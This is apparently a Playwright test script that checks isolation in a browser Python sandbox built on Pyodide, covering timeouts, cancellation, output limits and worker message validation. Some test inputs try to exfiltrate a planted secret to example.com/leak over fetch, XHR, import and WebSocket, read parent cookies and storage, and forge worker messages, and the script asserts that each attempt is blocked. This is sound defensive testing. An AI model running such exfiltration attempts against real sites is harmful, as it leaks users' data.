import assert from 'node:assert/strict';
import {readFile, readdir, writeFile} from 'node:fs/promises';
import {chromium, devices} from '@playwright/test';
const testURL = process.env.SPIKE_TEST_URL ?? 'http://127.0.0.1:3190';
const runtimePrefix = process.env.SPIKE_RUNTIME_PREFIX ?? '/runtime/';
const evidence = {date:new Date().toISOString(), testURL, runtimePrefix, environment:'Windows loopback; desktop and Pixel 7 emulation; no deployment or physical device', runs:[]};
const browser = await chromium.launch();
evidence.browser = browser.version();
try {
  for (const mobile of [false,true]) {
    const context = await browser.newContext(mobile ? devices['Pixel 7'] : {});
    const page = await context.newPage();
    const cdp = await context.newCDPSession(page);
    const failures = [];
    page.on('requestfailed', request => failures.push({url:request.url(),error:request.failure()}));
    await page.goto(testURL);
    await page.evaluate(() => {localStorage.setItem('h2compute.progress','sentinel-progress'); document.cookie='sentinel=secret; SameSite=Strict';});
    const mode = mobile ? 'mobile-emulation' : 'desktop';
    const run = async (name, source, stdin='', options={}) => {
      source = source.replaceAll('http://127.0.0.1:3190', testURL).replaceAll('ws://127.0.0.1:3190', testURL.replace(/^http/, 'ws'));
      await page.evaluate(()=>performance.clearResourceTimings());
      const result = await page.evaluate(args => window.spike.execute(args.source,args.stdin,args.options), {source,stdin,options});
      result.assets = await page.evaluate(()=>performance.getEntriesByType('resource').filter(r=>r.name.includes('/runtime/')).map(r=>({name:r.name.split('/').pop(),transferSize:r.transferSize,encodedBodySize:r.encodedBodySize,decodedBodySize:r.decodedBodySize})));
      evidence.runs.push({mode,name,...result}); console.log(mode,name,result.state,Math.round(result.loadMs??0),Math.round(result.totalMs??0)); return result;
    };
    let r=await run('cold stdin/stdout/stderr','import sys\nprint(input())\nprint("error channel",file=sys.stderr)','supplied input\n');
    assert.equal(r.state,'completed'); assert.equal(r.stdout,'supplied input\n'); assert.equal(r.stderr,'error channel\n'); assert.match(r.python,/^3\.14\.2 /);
    r=await run('warm unicode/no-final-newline','import sys\nprint(input())\nsys.stdout.write("끝")','é\n'); assert.equal(r.stdout,'é\n끝');
    for (const [name,code,error] of [['syntax','if :','SyntaxError'],['runtime','1/0','ZeroDivisionError'],['EOF','input()','EOFError']]) {
      r=await run(name,code); assert.equal(r.state,'runtime-error'); assert.ok(r.detail.includes(error));
    }
    r=await run('infinite loop watchdog','while True: pass','',{executionTimeout:500}); assert.equal(r.state,'timeout');
    for (const action of ['cancel','reset']) {
      await page.evaluate(() => {window.pending=window.spike.execute('while True: pass');});
      await page.waitForFunction(()=>window.spike.state==='running');
      await page.evaluate(action=>{document.getElementById('sentinel').textContent='still responsive'; window.spike[action]();},action);
      r=await page.evaluate(()=>window.pending); assert.equal(r.state,'cancelled'); evidence.runs.push({mode,name:action,...r});
      for(let attempt=0;attempt<20 && (await cdp.send('Target.getTargets')).targetInfos.some(t=>t.type==='worker');attempt++) await page.waitForTimeout(100);
      assert.equal((await cdp.send('Target.getTargets')).targetInfos.filter(t=>t.type==='worker').length,0);
      r=await run(action+' recovery','print("fresh")'); assert.equal(r.stdout,'fresh\n');
    }
    r=await run('output flood','while True: print("x"*1000)'); assert.equal(r.state,'output-limit'); assert.ok(Buffer.byteLength(r.stdout+r.stderr)<=16384);
    r=await run('set globals/files','x=42\nopen("/tmp/prior","w").write("prior")'); assert.equal(r.state,'completed');
    r=await run('fresh job/case','import os\nprint("x" in globals(),os.path.exists("/tmp/prior"))'); assert.equal(r.stdout,'False False\n');
    r=await run('worker DOM/storage/navigation','import js\nfor name in ["window","document","parent","localStorage","sessionStorage","cookieStore"]:\n    print(name,bool(js.Reflect.has(js.globalThis,name)))'); assert.equal(r.state,'completed'); assert.ok(!r.stdout.includes('True'));
    r=await run('CSP network denial','import js\nfrom pyodide.ffi import run_sync\nfor url in ["http://127.0.0.1:3190/leak?source=secret","https://example.com/leak?source=secret"]:\n    try:\n        run_sync(js.fetch(url))\n        print("BAD fetch")\n    except Exception:\n        print("fetch denied")\n    try:\n        xhr=js.XMLHttpRequest.new()\n        xhr.open("GET",url,False)\n        xhr.send()\n        print("BAD xhr")\n    except Exception:\n        print("xhr denied")');
    assert.equal(r.state,'completed'); assert.equal((r.stdout.match(/fetch denied/g)??[]).length,2); assert.equal((r.stdout.match(/xhr denied/g)??[]).length,2); assert.ok(!r.stdout.includes('BAD'));
    await page.evaluate(()=>{window.pending=window.spike.execute('while True: pass');}); await page.waitForFunction(()=>window.spike.state==='running');
    const boundary=await page.frames()[1].evaluate(hostURL=>{
      const denied={};
      for (const [name,action] of Object.entries({DOM:()=>parent.document.body,storage:()=>localStorage.length,cookies:()=>document.cookie,navigation:()=>{parent.location.href=hostURL+'/leak';}})) {try {action(); denied[name]=false;} catch {denied[name]=true;}}
      return denied;
    },testURL);
    assert.deepEqual(boundary,{DOM:true,storage:true,cookies:true,navigation:true}); evidence.runs.push({mode,name:'opaque frame boundary',...boundary});
    await page.evaluate(()=>window.spike.cancel()); await page.evaluate(()=>window.pending);
    r=await run('stale messages','import js\njs.postMessage(js.JSON.parse(\'{"type":"completed","session":"old","job":"old"}\'))\nprint("real")'); assert.equal(r.stdout,'real\n'); assert.ok(await page.evaluate(()=>window.spike.ignored)>=1);
    r=await run('wrong job discarded','import js\njs.eval(\'globalThis.postMessage=((original)=>m=>{original({...m,job:"old"});original(m)})(postMessage)\')\nprint("real")'); assert.equal(r.stdout,'real\n');
    for (const [name,change,state] of [['malformed','type:"unknown"','protocol-error'],['invalid stream','stream:"html"','protocol-error'],['oversized output','type:"output",stream:"stdout",text:"x".repeat(20000)','output-limit']]) {
      r=await run(name,`import js\njs.eval('globalThis.postMessage=((original)=>m=>original({...m,${change}}))(postMessage)')\nprint(1)`); assert.equal(r.state,state);
    }
    r=await run('message flood', 'import js\njs.eval(\'globalThis.postMessage=((original)=>m=>{for(let i=0;i<1000;i++)original(m)})(postMessage)\')\nprint(1)'); assert.equal(r.state,'output-limit');
    r=await run('native fetch/import/websocket CSP', 'import js\nfrom pyodide.ffi import run_sync\nfor code in [\'WorkerGlobalScope.prototype.fetch.call(self,"https://example.com/leak")\',\'import("https://example.com/leak.mjs")\',\'new Promise(resolve=>{const w=new WebSocket("ws://127.0.0.1:3190/leak"); w.onerror=()=>resolve("denied"); w.onopen=()=>resolve("BAD")})\']:\n    try:\n        result=run_sync(js.eval(code))\n        print(str(result))\n    except Exception:\n        print("denied")'); assert.equal(r.state,'completed'); assert.ok(!r.stdout.includes('BAD')); assert.equal((r.stdout.match(/denied/g)??[]).length,3);
    r=await run('oversized source','é'.repeat(8193)); assert.equal(r.state,'invalid-input');
    r=await run('oversized stdin','print(1)','x'.repeat(8193)); assert.equal(r.state,'invalid-input');
    r=await run('loading watchdog','print(1)','',{loadTimeout:1}); assert.equal(r.state,'unavailable');
    await page.reload();
    await page.route('**' + runtimePrefix + 'pyodide.asm.wasm',route=>route.abort()); r=await run('blocked download','print(1)'); assert.equal(r.state,'unavailable'); await page.unroute('**' + runtimePrefix + 'pyodide.asm.wasm');
    r=await run('download recovery','print("recovered")'); assert.equal(r.stdout,'recovered\n');
    for (const file of await readdir(new URL('../../content/exercises/',import.meta.url))) {
      const content=await readFile(new URL('../../content/exercises/'+file,import.meta.url),'utf8');
      const meta=JSON.parse(content.split('---')[1]);
      for (const [index,code] of [...content.split('<!-- model -->')[1].matchAll(/```python\r?\n([\s\S]*?)```/g)].entries()) {
        for (const [caseIndex,example] of meta.examples.entries()) {r=await run(`authored ${file} model ${index} case ${caseIndex}`,code[1],example.input); assert.equal(r.state,'completed'); assert.equal(r.stdout,example.output);}
      }
    }
    assert.equal(await page.evaluate(()=>localStorage.getItem('h2compute.progress')),'sentinel-progress'); assert.match(await page.evaluate(()=>document.cookie),/sentinel=secret/); assert.equal(page.url(),new URL(testURL).href);
    assert.equal(await page.evaluate(()=>document.querySelectorAll('iframe').length),0);
    assert.equal((await cdp.send('Target.getTargets')).targetInfos.filter(t=>t.type==='worker').length,0);
    evidence.runs.push({mode,name:'failed requests',failures}); await context.close();
  }
  const context=await browser.newContext(); const page=await context.newPage(); const cdp=await context.newCDPSession(page);
  await cdp.send('Network.enable'); await cdp.send('Network.emulateNetworkConditions',{offline:false,latency:80,downloadThroughput:1250000,uploadThroughput:1250000}); await cdp.send('Emulation.setCPUThrottlingRate',{rate:4});
  await page.goto(testURL);
  const measured=await page.evaluate(()=>window.spike.execute('print("throttled")','',{loadTimeout:60000})); assert.equal(measured.stdout,'throttled\n');
  evidence.runs.push({mode:'emulated 10Mbps, 80ms latency, 4x CPU slowdown',name:'cold loading',...measured}); await context.close();
} finally {await writeFile(new URL(process.env.SPIKE_RESULTS_FILE ?? './results.json',import.meta.url),JSON.stringify(evidence,null,2)+'\n'); await browser.close();}
